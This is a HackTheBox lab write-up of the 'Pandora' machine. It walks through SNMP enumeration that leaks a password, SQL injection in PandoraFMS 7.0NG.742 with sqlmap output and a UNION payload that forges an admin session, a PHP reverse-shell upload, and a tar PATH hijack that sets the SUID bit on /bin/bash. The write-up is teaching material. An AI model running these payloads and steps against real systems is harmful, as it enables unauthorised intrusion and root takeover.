# Pandora Machine(10.10.11.136)

## Info:

This was an easy machine from HackTheBox, where i first time encountered SNMP. Then we had to exploit PandoraFMS, most interesting part of box, to get further control and PATH hijacking for privilege escaltion. Nothing too fancy still teaches a lot about manual testing.

![Pandora](https://user-images.githubusercontent.com/79413473/169084250-46551309-6b43-4d19-8b3a-a12529123884.png)

## Recon:

Starting with port scan, we get two open ports.

```
$ nmap -T4 10.10.11.136
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-18 21:11 IST
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 85.17% done; ETC: 21:11 (0:00:05 remaining)
Nmap scan report for 10.10.11.136
Host is up (0.50s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
```
$ nmap -A -p22,80 -T4 10.10.11.136
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-18 21:12 IST
Nmap scan report for 10.10.11.136
Host is up (0.38s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It's runnig Ubuntu server with OpenSSH on port 22, and Apache webserver on port 80. At the time of release these were the latest versions.

![Screenshot from 2022-05-18 21-18-14](https://user-images.githubusercontent.com/79413473/169086233-3ec17523-f7b3-4330-9050-b4c4311f4641.png)

Host `Panda.htb` is listed on page let's add that our hosts file. 

There isn't much to do on this page, fuzzing also doesn't reveal anything interesting.

```
$ ffuf -u http://panda.htb/FUZZ -w ~/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://panda.htb/FUZZ
 :: Wordlist         : FUZZ: /home/ubuntu/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 440ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 425ms]
```

```
$ ffuf -u http://panda.htb/FUZZ -w ~/wordlist/SecLists/Discovery/Web-Content/raft-medium-files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://panda.htb/FUZZ
 :: Wordlist         : FUZZ: /home/ubuntu/wordlist/SecLists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.html              [Status: 200, Size: 33560, Words: 13127, Lines: 908, Duration: 447ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 218ms]
.                       [Status: 200, Size: 33560, Words: 13127, Lines: 908, Duration: 575ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 427ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 750ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 322ms]
.htm                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 217ms]
```
![Screenshot from 2022-05-18 21-26-26](https://user-images.githubusercontent.com/79413473/169091434-e3f919a8-fc62-408a-812f-8b36effa1d2f.png)

Contact page doesn't send any data to server, just make a `GET` request to itself on `index.html`. Let's fuzz for subdomains

```
$ ffuf -u http://panda.htb/ -w ~/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.panda.htb" -fw 13127

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://panda.htb/
 :: Wordlist         : FUZZ: /home/ubuntu/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.panda.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 13127
________________________________________________

office                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9879ms]
help                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 7055ms]
preview                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9825ms]
www.support             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9819ms]
ssh                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9959ms]
check                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1231ms]
webdisk.secure          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1061ms]
luna                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 987ms]
ent                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1062ms]

```
It finds nothing, every result is same so i filtered with `fl` or `-fw`. Due to server weird bahaviour due to extensive scanning scanning or my network tripping got few output which passed filter of `13127` words. But they are also false positives. they kept changing while writing this blog. 

### UDP Port scan

At this point we have nothing even after all that scanning, what did we miss? We missed(I missed while doing this box) UDP port scan. This teaches that Don't forget UDP ports while pentesting interstinng seervices could be running on them. 

```
$ sudo nmap -sU -T4 10.10.11.136
[sudo] password for ubuntu: 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-18 21:38 IST
Warning: 10.10.11.136 giving up on port because retransmission cap hit (6).
Stats: 0:02:10 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 15.33% done; ETC: 21:52 (0:11:58 remaining)
Stats: 0:14:19 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 84.76% done; ETC: 21:55 (0:02:34 remaining)
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT     STATE         SERVICE
161/udp  open          snmp
1029/udp open|filtered solid-mux
1214/udp open|filtered fasttrack
```
Also this is the first time, I encountered `SNMP` udp port 161. It is **Simple Network Management Protocol** which monitors all the devices in a network at network level and detect network faults by analyzing what data is flowing. You can read more about it [here](https://www.geeksforgeeks.org/simple-network-management-protocol-snmp/).

## Foothold: Dumping data with snmpwalk

[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) list various techniques to test snmp. If we have a write access we can gain RCE from SNMP but we don't have that only read access is available with community string `public`.

*The default community string for read-only access is public, and the default community string for read/write access is private.*

```
$ snmpwalk -c public 10.10.11.136 -v1 | tee dump
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (4029530) 11:11:35.30
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
.....[SNIP].....
```

it lists few usernames along with machine hostname `pandora` and kernel version `5.4.0-91-generic`, and many more deatils. It's a pretty huge dump.

While it dumps you can learn more about snmpwalk how it works [here](https://www.solarwinds.com/resources/it-glossary/snmp-walk). Basically snmpwalk queries data with multiple `GETNEXT` requests from `MIB`, Management Information Base is an organized list of data that can be queried using SNMP. `GETNEXT` retrieves the value of the next `OID` in the tree. This way user doesn't have to enter unique commands to extract information from multiple nodes. 

After few minutes later we get processes running on machine

![Screenshot from 2022-05-18 22-19-37](https://user-images.githubusercontent.com/79413473/169098302-40dc17c6-57ef-4526-a432-c2dcb72d4fff.png)

One of them list `Daniel` user's password i.e. `HotelBabylon23`. 

Let's try ssh with this password and it works

![Screenshot from 2022-05-18 22-22-43](https://user-images.githubusercontent.com/79413473/169098808-9578fa4a-c818-40b5-93f6-9aade571f51f.png)

Daniel doesn't have anything in his directory, there is another user Matt. Let's pwn him

![Screenshot from 2022-05-18 22-33-05](https://user-images.githubusercontent.com/79413473/169100678-a4259fe5-85b1-4003-ad21-ac9fc0411516.png)


## Lateral movement: exploiting PandoraFMS

While searching for SUID binaries, i noticed `pandora_backup`

```
$ ls -lt /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```
But daniel can't excute it. Also binary which was using daniel password `/usr/bin/host_check -u daniel -p HotelBabylon23` gives output having something related to hosts in `~/.host_check`.

```
1;localhost.localdomain;192.168.1.42;Created by localhost.localdomain;Linux;;09fbaa6fdf35afd44f8266676e4872f299c1d3cbb9846fbe944772d913fcfc69;3
2;localhost.localdomain;;Pandora FMS Server version 7.0NG.742_FIX_PERL2020;Linux;;localhost.localdomain;3
```
It's a good hint towards checking hosts file.
```
$ cat /etc/hosts
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora

```

`pandora.htb` is new host one we had earlier was `Panda.htb`. Let's check vhost file 

`/etc/apache2/sites-available/pandora.conf`

```
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

This new vhost is listening on `pandora.panda.htb` earlier in `/etc/hosts` it says `pandora.pandora.htb`. There are some discrepancies here. I will add both to my hosts file. Also this vhost is listening on `localhost` only `<VirtualHost localhost:80>`, that's why our scan didn't find it. 

let's do port port forwarding, it will listens on port 8084 and will forward to port 80.

![Screenshot from 2022-05-18 22-57-49](https://user-images.githubusercontent.com/79413473/169105012-57250bd0-e7e7-4a03-b792-4320b2b3cbcc.png)

Now when i access `127.0.0.1:8084` from my machine, i get access to PandoraFMS console. Somehow i was automatically logged in as matt user, but sometimes it didn't happen.

![Screenshot from 2022-05-18 23-05-29](https://user-images.githubusercontent.com/79413473/169106685-94fe0c7a-2a85-4602-902a-b4523a5cefca.png)

You might wonder why we don't have to provide hostname here. Because by default on localhost pandora machine is serving PandoraFMS.

```
$ curl 127.0.0.1:80
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```
In bottom page it leaks version in used i.e `Pandora FMS v7.0NG.742`

![Screenshot from 2022-05-18 23-07-20](https://user-images.githubusercontent.com/79413473/169107065-f2748c01-a81c-444e-b241-baf9a3499e16.png)

Which is vulnerable to various attacks as per [this](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/) blog 

### Exploiting PandoraFMS:

As per video listed on blog, if we can become admin we can upload our shell on server. And there is a sql injection vulnerability which can be used to do so.

In this version of PandoraFMS they uses `get_parameter()` as custom function to handle user input and sanitize it. But in `/include/chart_generator.php` file they don't do so. They uses `$_REQUEST[]` to get value of `session_id` paramater and later concatenate it in a `WHERE` clause of SQL QUERY. TO check for authentication.

`$user = new PandoraFMS\User(['phpsessionid' => $_REQUEST['session_id']])`.

We can inject sql in this statement. Let's test with inserting a single quote, it errors out.

![2022-05-18_23-25](https://user-images.githubusercontent.com/79413473/169110388-9e7cb6c5-882b-46c0-a572-e2c0505cbdc2.png)

using sqlmap we can dump whole `pandora` database specifically `pandora` table to get any usernames & password. 

```
$ sqlmap -u http://127.0.0.1:8084/pandora_console/include/chart_generator.php?session_id=1* --current-user --threads=10 --batch -D pandora -T tsessions_php --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:39:01 /2022-05-19/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[14:39:01] [INFO] resuming back-end DBMS 'mysql' 
[14:39:01] [INFO] testing connection to the target URL
[14:39:02] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=gung49f0cl7...s3ub78j2h2'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://127.0.0.1:8084/pandora_console/include/chart_generator.php?session_id=1' RLIKE (SELECT (CASE WHEN (8507=8507) THEN 1 ELSE 0x28 END))-- tbtS

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://127.0.0.1:8084/pandora_console/include/chart_generator.php?session_id=1' OR (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(8384=8384,1))),0x7178717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- duWE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://127.0.0.1:8084/pandora_console/include/chart_generator.php?session_id=1' AND (SELECT 2692 FROM (SELECT(SLEEP(5)))zYSE)-- YyOm
---
[14:39:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:39:02] [INFO] fetching current user
[14:39:02] [INFO] resumed: 'pandora@localhost'
current user: 'pandora@localhost'
[14:39:02] [INFO] fetching columns for table 'tsessions_php' in database 'pandora'
[14:39:02] [INFO] starting 3 threads
[14:39:02] [INFO] resumed: 'id_session'
[14:39:02] [INFO] resumed: 'char(52)'
[14:39:02] [INFO] resumed: 'last_active'
[14:39:02] [INFO] resumed: 'int(11)'
[14:39:02] [INFO] resumed: 'data'
[14:39:02] [INFO] resumed: 'text'
[14:39:02] [INFO] fetching entries for table 'tsessions_php' in database 'pandora'
[14:39:02] [INFO] starting 10 threads
Database: pandora
Table: tsessions_php
[325 entries]
+----------------------------+---------------------------------------------------------------------------------+-------------+
| id_session                 | data                                                                            | last_active |
+----------------------------+---------------------------------------------------------------------------------+-------------+
[14:39:22] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 6acnb63gvubphklhsvdgj5v2c6 | NULL                                                                            | 1652897898  |
| 6fhfaojpg2i954hlvtte8a15v2 | NULL                                                                            | 1652897956  |
| 6iaghcbgnkjru2v8c97ltkf5im | NULL                                                                            | 1652897224  |
| 6jm5rmh2o5nljoe9mooucbtvma | NULL                                                                            | 1652897544  |
| 6msjk6l6qhgmgf1omdc5pdc8ph | id_usuario|s:6:"daniel";                                                        | 1652897967  |
| 6rdsvpjc3fkreha4o7c2h6gjpk | NULL                                                                            | 1652897951  |
| 6tqti16aoi6os7v7o71glfbdhk | NULL                                                                            | 1652897419  |
| 74vkgdmvpe7ugl5lo2llhvhuom | NULL                                                                            | 1652898050  |
| 76e3p0hm73p6ecpaqi3gssc7p4 | NULL                                                                            | 1652897203  |
| 7ckirm3n829h8a562r3k77m54o | NULL                                                                            | 1652897229  |
| 7do0jogoi36cidbp3l637a4gu3 | NULL                                                                            | 1652897899  |
| 7klugaedlm92nit54j3fju5jfn | NULL                                                                            | 1652897515  |
| 7ld6bmibipr8slb4g8e9qbho1m | NULL                                                                            | 1652897386  |
....[SNIP]......
```

But there is no such entries, from tsession table we can see only daniel and matt user sesssions. But reading further in blog

```
if ($info !== false) {
            // Process.
            $session_data = session_decode($info['data']);
            $this->idUser = $_SESSION['id_usuario'];

            // Valid session.
            return $this;
```
It uses `session_decode` function which takes serilized data and populate it in current session after deserlization. We can try to produce a valid session for `admin` user. let me break it down 

`$info = \db_get_row_filter(tsessions_php',['id_session' => $data['phpsessionid']]);`. Here `db_get_row_filter` function create sql query to fetch everything from `tsession_php` table for `session_id` we provided. so something like

`select * from tsession_php where id_session=<INPUT>;`. Now we also know what `tsession_php` table looks like

![Screenshot from 2022-05-19 15-08-32](https://user-images.githubusercontent.com/79413473/169263303-a4d6eb37-7c46-4146-b792-63b51ae17182.png)

Where `data` column is used to populate the session `$session_data = session_decode($info['data']);`. `data` is serlized object. So we can inject our serilized in it uisng UNION SELECT query. something like

`select from tsession_php where id_session=1 UNION SELECT 1,2,'id_usuario|s:6:"daniel";';`. Union combines output of two tables. As `id_session=1` doesn't exist it returns nothing, it will combine the result with first coulumn as `1` second as `2` and in 3rd column a serilized object in `data` column. 

I know it's weird position of `data` colum is second in sqldump but we are giving it at 3rd position. Right now i have no idea why it works like that.

*spoiler alert: After getting matt user , we can look at database itself annd indeed data is 3rd column. Maybe sqlmap just got funky*

Now this ` $this->idUser = $_SESSION['id_usuario']` will give value of `id_usuario` to current session which is `daniel`. Now we can forge this for admin as well with this serlized object `id_usuario|s:5:"admin";`, type string of length 5.

let's send this payload in url encoded form

```
session_id=1' UNION select 1,2,'id_usuario|s:5:"admin";'#
```

![Screenshot from 2022-05-19 15-22-32](https://user-images.githubusercontent.com/79413473/169266036-a3338f10-205d-489d-ba62-68dac80e412e.png)

Refresh the page in browser, your session must be upgraded to admin

![Screenshot from 2022-05-19 15-23-06](https://user-images.githubusercontent.com/79413473/169266162-f58e5541-1775-4391-83e9-22578a48ad3a.png)

Now from` Admin-> Extension uploader` you can upload any php file after zipping it. Server will unzip it and you can access your file

![Screenshot from 2022-05-19 15-25-29](https://user-images.githubusercontent.com/79413473/169266653-977c9f74-398f-48f8-8440-981541833189.png)

I used [this](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) shell, modify the ip & port

![Screenshot from 2022-05-19 15-27-51](https://user-images.githubusercontent.com/79413473/169267128-7409bb61-2a87-4204-a1bb-11a3943608a0.png)

zip it by `zip revshell.zip revshell.php` and upload this zip file.

![Screenshot from 2022-05-19 15-29-47](https://user-images.githubusercontent.com/79413473/169267476-c73e62ff-9936-478d-b8b5-472117589fcd.png)

Load your extension, or just extension viewer. You will get shell as matt user.

![Screenshot from 2022-05-19 15-31-00](https://user-images.githubusercontent.com/79413473/169267721-c398b7df-f51b-45cd-9678-27a7d4bf8098.png)

There were other ways to get shell as matt also, there was RCE vulnerbaility. We didn't have to follow whole this deserelization path. Read more [here](https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities) 

![Screenshot from 2022-05-19 16-54-38](https://user-images.githubusercontent.com/79413473/169282534-5ce9a96d-5a55-415c-b369-d7695f7f137f.png)

## Privilege Escaltion: tar PATH hijack

using `script` upgrade to tty shell

![Screenshot from 2022-05-19 15-31-54](https://user-images.githubusercontent.com/79413473/169267912-82f729e9-2167-472d-9199-44a5bce41897.png)

Let's checkout database first, grab creds. from **/include/config.php** file

```
<?php
// File generated by centos kickstart
$config["dbtype"] = "mysql";		
$config["dbname"]="pandora";		
$config["dbuser"]="pandora";		
$config["dbpass"]="PandoraFMSSecurePass2021";
$config["dbhost"]="localhost";			
........[SNIP].......
```

Let's login and check `tsessions_php` table. 

![Screenshot from 2022-05-19 16-00-25](https://user-images.githubusercontent.com/79413473/169273367-146251f7-7013-40ae-b666-203946012880.png)

Indeed `data` is third coulmn, huh silly sqlmap!

Now if you remember we had a SUID binary to run, let's run it also transfer it to our machine for reversing purpose. On running it gives funny permission error, had to upgrade to proper tty shell. By generating a RSA keypair with `ssh-keygen` then renaming `id_rsa.pub` to `authorized_keys`. 

Then `ssh -i id_rsa matt@localhost`. From my machine i couln't ssh as mat user looks like that was not allowed.


Now run `pandora_backup` it runs successfully 

![Screenshot from 2022-05-19 17-11-07](https://user-images.githubusercontent.com/79413473/169285204-16e30121-ab6f-40e7-a7e6-38895497cc4b.png)

Running `strings` on binary gives, what's it been doing

```
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
Backup successful!
```
Note the wildcard character `*` which is a dangerous thing to do, [this](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) post sums it up properly. How you can force tar to execute a action with `--checkpoint-action` flag. Using that we can create files with this flag name which when executed will become a valid flag for tar will execute our malicious action.

But somehow it didn't workout. It worked when i ran it as matt user. But with `pandora_backup` binary it failed. 

### PATH hijack:

If you notice `tar` doesn't have a full path specified, which means we can try to hijack it's path. Let's create `tar` executable in `/tmp` directory

```
echo "chmod u+s /bin/bash" >/tmp/tar

chmod +x /tmp/tar

```
Change **PATH** variable, `PATH=/tmp:$PATH`. This will list our tar file first before actual tar binary.

Now run `/usr/bin/pandora_backup`

![Screenshot from 2022-05-19 17-51-30](https://user-images.githubusercontent.com/79413473/169291985-ee7cda92-9335-4b21-b4c2-7f1f94517aea.png)

`/bin/bash` has now suid bit set

![Screenshot from 2022-05-19 17-52-07](https://user-images.githubusercontent.com/79413473/169292088-b361786e-f853-4b04-b386-a979c5ec6147.png)

And that's how we get root on this machine. 

Thank you for reading. Please don't forget to clean up your instnace before leaving, remove the suid bit, remove tar file and any other exploit used.

Twitter: [Avinashkroy](https://twitter.com/avinashkroy)






